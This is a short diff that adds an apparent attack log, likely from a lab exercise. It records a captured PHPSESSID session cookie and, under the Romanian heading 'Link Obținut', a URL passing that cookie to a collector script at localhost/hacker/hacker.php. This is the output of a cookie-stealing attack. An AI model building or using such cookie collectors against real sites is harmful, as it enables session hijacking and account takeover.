@@ -1,0 +1,4 @@
+cookie we got:::1:PHPSESSID=4b7b2246a7b474c06deeb6786e49199c
+--------------------------------------------
+Link Obținut:
+http://localhost/hacker/hacker.php?cookie=PHPSESSID=4b7b2246a7b474c06deeb6786e49199c
